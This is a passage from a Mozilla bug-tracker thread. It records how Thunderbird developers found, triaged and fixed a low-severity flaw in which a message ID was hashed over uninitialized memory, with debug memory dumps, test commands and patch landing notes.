              Controls the same parameter as mallopt() M_PERTURB.

```

--- END QUOTE ---

From the [comment 2](/show_bug.cgi?id=1609607#c2 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: MD5 is calculated accessing uninitialized area.") of that bug.

--- BEGIN QUOTE ---

Oh, BTW, I notice that the hash calculation touches uninitialized memory region. The last hunk in the attached diff is for investigating this.

I knew that for a long time. But I let it pass since it is not unusual for some hash functions to

calculate the value using 4 or 8 octets at a time, and thus if we have interesting data which has a length of not multiple of 4, we may end up

accessing the last few uninitialized octets of a word: this happens in zip/unzip operation during |make mozmill| test

and I have suppressed the warning from valgrind after investigation revealed that it is a non-issue.

However, with this uninitialized memory access issue at hand, I investigated a bit more, and I now realized that uninitialized access during hash calcluation MAY end up generating message-ID for a message which does not have it to be attached a non-unique message ID.: that is, the message ID varies each time it is generated because of random data in uninitiailized memory. (Correct me if I am wrong here.)

This may happen when you import a message in an individual file and the message lacks a message ID.

If you include it in multiple folders, the same message will have a different message ID in different folders. So this may not be optimal.

But the practical impact of having the message with different message ID is not that great if I am not mistaken again.

HOWEVER, during investigation, I have noticed a glaring uninitialized memory creation and access in the code which I will report later. I am overwhelmed at what is going on and not sure where the problem begins, even.

--- END QUOTE ---

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1609607#c1)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1609607&comment_id=14595230 "2 revisions") |
|  | |

Attached patch

[Dump the buffer area when MD5 is calculated for message ID creation.](attachment.cgi?id=9121231&action=diff)
— [Details](attachment.cgi?id=9121231&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1609607&attachment=9121231)

The code to dump the buffer passed to MD5 creation.

You can see that the hash is calculated using |m\_header.GetSize()| as length, but the buffer contains way too much uninitialized garbage at the end...

Typical dump from xpcshell-tests.:

```
 0:35.12 TEST_START: comm/mailnews/base/test/unit/test_headerFoldingInDatabase.js

  0:35.42 pid:214785 {debug} Dump:tmp_buf: totalsize = 1024
 0:35.42 pid:214785 0x00:   F  r  o  m     -     S  a  t     A  p  r     1
 0:35.42 pid:214785 0x10:   4     1  4  :  0  1  :  3  0     2  0  1  8 NU
 0:35.42 pid:214785 0x20:  LF  D  a  t  e  :     S  a  t  ,     1  4     A
 0:35.42 pid:214785 0x30:   p  r     2  0  1  8     1  4  :  0  1  :  3  0
 0:35.42 pid:214785 0x40:      +  0  2  0  0 NU LF  S  u  b  j  e  c  t  :
 0:35.42 pid:214785 0x50:      B  a  d  l  y     f  o  l  d  e  d     h  e
 0:35.42 pid:214785 0x60:   a  d  e  r  s  ,     o  n  e     l  i  n  e
 0:35.42 pid:214785 0x70:   w  i  t  h           s  p  a  c  e           b
 0:35.42 pid:214785 0x80:   e  t  w  e  e  n           T  o     a  n  d
 0:35.42 pid:214785 0x90:   F  r  o  m NU NU  p  a  c  e           b  e  t
 0:35.42 pid:214785 0xA0:   w  e  e  n           T  o     a  n  d     F  r
 0:35.42 pid:214785 0xB0:   o  m CR LF    NU LF  T  o  :     "  R  e  c  i
 0:35.42 pid:214785 0xC0:   p  i  e  n  t        w  i  t  h        s  p  a
 0:35.42 pid:214785 0xD0:   c  e  s  "     <  r  e  c  i  p  i  e  n  t  @
 0:35.42 pid:214785 0xE0:   e  x  a  m  p  l  e  .  c  o  m  > NU NU    NU
 0:35.42 pid:214785 0xF0:  LF  F  r  o  m  :     s  e  n  d  e  r  @  e  x
 0:35.42 pid:214785 0x00:   a  m  p  l  e  .  c  o  m NU LF a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x10:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x20:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x30:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x40:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x50:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x60:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x70:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x80:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x90:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xA0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xB0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xC0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xD0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xE0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xF0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x00:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x10:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x20:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x30:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x40:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x50:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x60:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x70:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x80:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x90:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xA0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xB0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xC0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xD0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xE0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xF0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x00:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x10:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x20:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x30:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x40:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x50:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x60:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x70:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x80:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0x90:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xA0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xB0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xC0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xD0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xE0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
 0:35.42 pid:214785 0xF0:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5

```
Assignee: nobody → ishikawa

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1609607#c2)• 5 years ago |
|  | |

Note that there are cases where header line's CRLF or LF is completely substituted by NUL (in my dump NUL is printed as NU).

```
 0:02.86 TEST_START: comm/mailnews/compose/test/unit/test_autoReply.js
...
 0:03.21 INFO comm/mailnews/compose/test/unit/test_autoReply.js | Starting copy_gIncomingMailFile
...
 0:03.22 INFO comm/mailnews/compose/test/unit/test_autoReply.js | Starting copy_gIncomingMailFile3
...
 0:03.23 pid:215945 {debug} Dump:tmp_buf: totalsize = 1024
 0:03.23 pid:215945 0x00:   F  r  o  m     -     S  u  n     A  p  r     2
 0:03.23 pid:215945 0x10:   6     2  1  :  3  0  :  5  9     2  0  1  5 NU
 0:03.23 pid:215945 0x20:   S  u  b  j  e  c  t  :     m  a  i  l     w  i
 0:03.23 pid:215945 0x30:   t  h     n  o     f  r  o  m NU  T  o  :     f
 0:03.23 pid:215945 0x40:   r  o  m  @  f  o  o  .  i  n  v  a  l  i  d NU
 0:03.23 pid:215945 0x50:   C  o  n  t  e  n  t  -  T  y  p  e  :     t  e
 0:03.23 pid:215945 0x60:   x  t  /  p  l  a  i  n  ;     c  h  a  r  s  e
 0:03.23 pid:215945 0x70:   t  =  "  U  T  F  -  8  " NU  M  I  M  E  -  V
 0:03.23 pid:215945 0x80:   e  r  s  i  o  n  :     1  .  0 NU a5 a5 a5 a5
 0:03.23 pid:215945 0x90:  a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5 a5
...

```

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1609607#c3)• 5 years ago |
|  | |

I thought the whole log from xpcshell-tests could be seen in the try-comm-central job.

<https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&selectedJob=285106307>

However, I realized that, in order to get the local log, I had to run the xpcshell-tests with --verbose option since the stderr/stdout output is not shown otherwise AND

serially (not in parallel execution mode) so that the dump is not cluttered up with parallel execution of various tests.

So the dump is not visible in the above job. (BTW, xpcshell-tests log with "--verbose" is so full of suspicious errors/warnings. If we can remove some of them, TB would be more robust, but I digress.)

The dump is close to 60MB. If anyone really wants to see the log, I can upload it somewhere and post a link here.

BTW, it seems that this MD5 calculation is invoked for missing message-ID header case to generate message ID.

This means that A MALICIOUS MAIL SERVER CAN STRIP THE MESSAGE HEADER AND CAUSE THIS UNINITIALIZED MEMORY ACCESS DURING MD5 calculation on TB client. Not sure that could be a security problem albeit non-optimal situation where the same duplicate message (same headers) would end up with different message IDs due to uninitialized garbage input to MD5.

The previous bug in 1608539 of uninitialized m\_headerstartpos is worse since the header area manipulation (and the resulting data stored in DB) can be completely bogus although how that is triggered is not clear yet.

Anyway, the area size passed to MD5 calculation is way too large.

From [bug 1608539 comment 8](/show_bug.cgi?id=1608539#c8 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: |m_headerstartpos| is not always initialized in nsParseMailMessageState::FinalizeHeaders()") : Slightly edited

I think instead of passing GetSize() of buffer area that stores the header data to md5->Update routine to calculate the MD5 and to generate a missing message ID, we should probably keep track of the ending position (NUL code at the end of the last header line when the headers are parsed and stored.: NEWLINE, CR LF seem to be replaced with NUL in the code. Well, CR LF seems to be replaced with NUL LF ?) and pass the length from the m\_headerstartpos to that position.

However, as the forgotten initialization of m\_headestartpos shows there seem to a can of worms around here.

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1609607#c4)• 5 years ago |
|  | |

Attached file
[Identifying which tests trigger the symptom](attachment.cgi?id=9121233)
— [Details](attachment.cgi?id=9121233&action=edit)

The following command identifies the files that trigger the problem.

```
egrep "(TEST_START|{debug} Dump:tmp_buf: totalsize = |nrun-xpcshell-original.sh|Failed: 1| a5|a5a5a5a5|\| Starting)" log

```

The attached file is the output.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1609607#c5)• 5 years ago |
|  | |

Kai: does sec-moderate seem right?

Flags: needinfo?(kaie)Keywords: [csectype-uninitialized](/buglist.cgi?keywords=csectype-uninitialized&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1609607#c6)• 5 years ago |
|  | |

I think I found the cause.

We should use GetBufferPos() instead of GetSize() when we pass the valid length of the buffer data.

With this I could eliminate the access to uninitialized memory.

However, I have noticed an anomaly in the log.

There are cases when the header buffer ends with a NUL and no NEWLINE at the end.

Majority of the cases seem to end with NEWLINE.

It seems that the code does not uniformly handle the input data that ends either

* LF, or
* CR LF
* missing the above line-ending sequence at all (?).

I think all the above cases should generate the same MD5 signature and thus the same message ID, but

I am running out of steam. Eliminating the uninitialized memory access is the main target for now.

I have verified my local patch works as far as xpcshell-tests is concerned.

For some reason, I have not been able to run mochitest locally (under Debian GNU/Linux amd64).

[Bug 1608532](/show_bug.cgi?id=1608532 "NEW - C-C TB mochitest does not run locally on a linux PC due to an assertion.: GECKO(119773) Assertion failure: !mRawPtr, at /NEW-SSD/moz-obj-dir/objdir-tb3/dist/include/mozilla/StaticPtr.h:51")

To verify the patch, I need to run the mochitest somehow.

However, I am not sure if I should submit the patch to try-comm-central since the patch and the log will be visible to anybody.

Is there a way to restrict the access to the job submission and log because of security concern?

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1609607#c7)• 5 years ago |
|  | |

Attached patch

[valgrind-xpctest-check.patch (take 3)](attachment.cgi?id=9121387&action=diff)
— [Details](attachment.cgi?id=9121387&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1609607&attachment=9121387)

This is the local patch I am testing. This passes xpcshell-tests.

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1609607#c8)• 5 years ago |
|  | |

Attached file
[Extracted lines from xpcshell-tests log file with the patch.](attachment.cgi?id=9121390)
— [Details](attachment.cgi?id=9121390&action=edit)

I ran xpcshell-tests serially and with --verbose so that the log files are easy to parse (no output from parallel run will get mixed up.).

The command is as follows.:

```
export MALLOC_CHECK_=3
export MALLOC_PERTURB_=0x5A

TESTDIRS="
comm/chat/components/src/test
comm/chat/modules/test
comm/chat/protocols/irc/test
comm/chat/protocols/skype/test
comm/chat/protocols/xmpp/test
comm/common/saxparser/test/unit
comm/common/test/xpcshell
comm/ldap/xpcom/tests/unit
comm/mail/base/test/unit
comm/mail/components/enterprisepolicies/tests/xpcshell
comm/mail/components/extensions/test/xpcshell
comm/mail/components/test/unit
comm/mailnews/addrbook/test/unit
comm/mailnews/base/test/unit
comm/mailnews/compose/test/unit
comm/mailnews/db/gloda/test/unit
comm/mailnews/db/msgdb/test/unit
comm/mailnews/extensions/bayesian-spam-filter/test/unit
comm/mailnews/extensions/mdn/test/unit
comm/mailnews/extensions/newsblog/test/unit
comm/mailnews/imap/test/unit
comm/mailnews/import/test/unit
comm/mailnews/intl/test/unit
comm/mailnews/jsaccount/test/unit
comm/mailnews/local/test/unit
comm/mailnews/mime/jsmime/test
comm/mailnews/mime/test/unit
comm/mailnews/news/test/unit
"
for dir in $TESTDIRS
do
    bash -vx ~ishikawa/bin/nrun-xpcshell-original.sh --sequential --verbose ${dir}
done

```

Then I ran the following command on the log to extra the attached file.

```
egrep "(Failed: |  a5|buffer area|totalsize =|\| Starting|TEST_START)" log1161-xpcshell.txt

```

You can see that there is no longer an uninitialized memory access (the dumped memory area did not contain the telltale a5.

Also, you may notice that there ARE buffer areas that end in a NUL and not LF as is usually the case.

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1609607#c9)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1609607&comment_id=14596499 "3 revisions") |
|  | |

Oh well, while testing, I already submitted a try-comm-central job, :-(

And honestly speaking, I think big underground organizations and/or nation-state parties would have known the problem for a LOOONG time.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1609607#c10)• 5 years ago |
|  | |

I don't think there's a way to submit "hidden" jobs. But, probably not too much to worry about here - without context someone looking would still have to do a lot of work to take advantage of it.

Sounds like it's best to clean up the patch, and get it reviewed and committed.

Status: NEW → ASSIGNED

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1609607#c11)• 5 years ago |
|  | |

(In reply to Magnus Melin [:mkmelin] from [comment #10](/show_bug.cgi?id=1609607#c10 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: MD5 is calculated accessing uninitialized area."))

> I don't think there's a way to submit "hidden" jobs. But, probably not too much to worry about here - without context someone looking would still have to do a lot of work to take advantage of it.
>
> Sounds like it's best to clean up the patch, and get it reviewed and committed.

Will do.

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1609607#c12)• 5 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #5](/show_bug.cgi?id=1609607#c5 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: MD5 is calculated accessing uninitialized area."))

> Kai: does sec-moderate seem right?

sec-low seems sufficient.

Flags: needinfo?(kaie)Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---) → [sec-low](/buglist.cgi?keywords=sec-low&resolution=---)

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1609607#c13)• 5 years ago |
|  | |

(In reply to ISHIKAWA, Chiaki (may be slow to respond until Jan 4.) from [comment #11](/show_bug.cgi?id=1609607#c11 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: MD5 is calculated accessing uninitialized area."))

> (In reply to Magnus Melin [:mkmelin] from [comment #10](/show_bug.cgi?id=1609607#c10 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: MD5 is calculated accessing uninitialized area."))
>
> > I don't think there's a way to submit "hidden" jobs. But, probably not too much to worry about here - without context someone looking would still have to do a lot of work to take advantage of it.
> >
> > Sounds like it's best to clean up the patch, and get it reviewed and committed.
>
> Will do.

I wanted to test the patch locally but got bitten with [bug 1609789](/show_bug.cgi?id=1609789 "RESOLVED DUPLICATE - C-C TB crashed when two messages are copied from Inbox folder of one account to another account's Inbox folder. \"Do not call the fragment parser (e.g innerHTML()) in chrome code or ...\"") locally which should have been solved by the source tree update.

Once I could run at least xpcshell-tests without ill-effect then I will submit a try server job and ask for an approval.

This patch will include the |m\_headerstartpos = 0| from [Bug #1608539](/show_bug.cgi?id=1608539 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: |m_headerstartpos| is not always initialized in nsParseMailMessageState::FinalizeHeaders()").

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1609607#c14)• 5 years ago |
|  | |

(In reply to ISHIKAWA, Chiaki (may be slow to respond until Jan 4.) from [comment #6](/show_bug.cgi?id=1609607#c6 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: MD5 is calculated accessing uninitialized area."))

> We should use GetBufferPos() instead of GetSize() when we pass the valid length of the buffer data.

Hello Chiaki, thanks a lot for your detective work and finding the cause of this bug!

In [bug 1608539](/show_bug.cgi?id=1608539 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: |m_headerstartpos| is not always initialized in nsParseMailMessageState::FinalizeHeaders()") you had included a suggested fix for this bug. You suggested that the buffer should be copied to avoid using garbage. I think that shouldn't be necessary.

I think that simply changing the call should be all we need. The has function will only use the amount of bytes that are passed as a parameter, and ignore anything else in the buffer after that number of bytes.

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1609607#c15)• 5 years ago |
|  | |

Attached patch

[1609607-v2.patch](attachment.cgi?id=9122922&action=diff)
— [Details](attachment.cgi?id=9122922&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1609607&attachment=9122922)

[Attachment #9122922](/attachment.cgi?id=9122922&action=edit "1609607-v2.patch") -
Flags: review?(mkmelin+mozilla)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1609607#a738014_101158)• 5 years ago |

[Attachment #9122922](/attachment.cgi?id=9122922&action=edit "1609607-v2.patch") -
Flags: review?(mkmelin+mozilla) → review+

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1609607#c16)• 5 years ago |
|  | |

<https://hg.mozilla.org/comm-central/rev/62a84e316dab6346317e77a75d50e79239a17936>

Status: ASSIGNED → RESOLVEDClosed: 5 years agoResolution: --- → FIXEDTarget Milestone: --- → Thunderbird 74.0

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1609607#c17)• 5 years ago |
|  | |

Comment on [attachment 9122922](/attachment.cgi?id=9122922 "1609607-v2.patch") [[details]](/attachment.cgi?id=9122922&action=edit "1609607-v2.patch") [[diff]](/attachment.cgi?id=9122922&action=diff "1609607-v2.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1609607&attachment=9122922)
1609607-v2.patch
[Approval Request Comment]
User impact if declined: random data used to calculate message id
Although this code reads random data, the data is simply used to calculate a message id. The fix ensures we use only real message properties, making the id calculation stable.
It doesn't seem urgent to merge to stable esr68. It's more of a correctness fix. Letting it bake for a while seems fine.
[Attachment #9122922](/attachment.cgi?id=9122922&action=edit "1609607-v2.patch") -
Flags: approval-comm-beta?

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1609607#a1225976_101158)• 5 years ago |

[Attachment #9122922](/attachment.cgi?id=9122922&action=edit "1609607-v2.patch") -
Flags: approval-comm-beta? → approval-comm-beta+

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1609607#c18)• 5 years ago |
|  | |

Comment on [attachment 9122922](/attachment.cgi?id=9122922 "1609607-v2.patch") [[details]](/attachment.cgi?id=9122922&action=edit "1609607-v2.patch") [[diff]](/attachment.cgi?id=9122922&action=diff "1609607-v2.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1609607&attachment=9122922)
1609607-v2.patch
On the other hand, while not urgent, it's a really obvious fix. I suggest to merge it to esr68, so we can get it off the radar of things we need to track.
[Attachment #9122922](/attachment.cgi?id=9122922&action=edit "1609607-v2.patch") -
Flags: approval-comm-esr68?

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1609607#a1228314_36541)• 5 years ago |

[status-thunderbird\_esr68](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=equals&v1=affected)
[tracking-thunderbird\_esr68](/buglist.cgi?f1=cf_tracking_thunderbird_esr68&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_thunderbird_esr68&o1=equals&v1=%3F)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1609607#a1230739_578488)• 5 years ago |

Alias: CVE-2020-6792

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1609607#a1234565_1689)• 5 years ago |

Group: mail-core-security → core-security-release

|  | [Rob Lemley [:rjl]](/user_profile?user_id=63411) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1609607#c19)• 5 years ago |
|  | |

Thunderbird 73.0b2:

<https://hg.mozilla.org/releases/comm-beta/rev/361783282f8a84f6aec382d366886966e64710b1>

[status-thunderbird73](/buglist.cgi?f1=cf_status_thunderbird_73&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_thunderbird_73&o1=equals&v1=fixed)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1609607#a1666708_101158)• 5 years ago |

[Attachment #9122922](/attachment.cgi?id=9122922&action=edit "1609607-v2.patch") -
Flags: approval-comm-esr68? → approval-comm-esr68+

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1609607#c20)• 5 years ago |
|  | |

Rob, can you please land into comm-esr68? Thanks.

Flags: needinfo?(rob)

|  | [Rob Lemley [:rjl]](/user_profile?user_id=63411) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1609607#c21)• 5 years ago |
| uplift | |

comm-esr68:

<https://hg.mozilla.org/releases/comm-esr68/rev/6bffe44514b3>

Flags: needinfo?(rob)

|  | [Rob Lemley [:rjl]](/user_profile?user_id=63411) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1609607#a1800330_63411)• 5 years ago |

[status-thunderbird\_esr68](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=equals&v1=fixed)

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1609607#a1845931_36541)• 5 years ago |

[tracking-thunderbird\_esr68](/buglist.cgi?f1=cf_tracking_thunderbird_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_thunderbird_esr68&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_thunderbird_esr68&o1=equals&v1=%2B)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1609607#a17748922_1689)• 4 years ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1609607&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from usn.ubuntu.com_e82e019a_20250119_123140.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
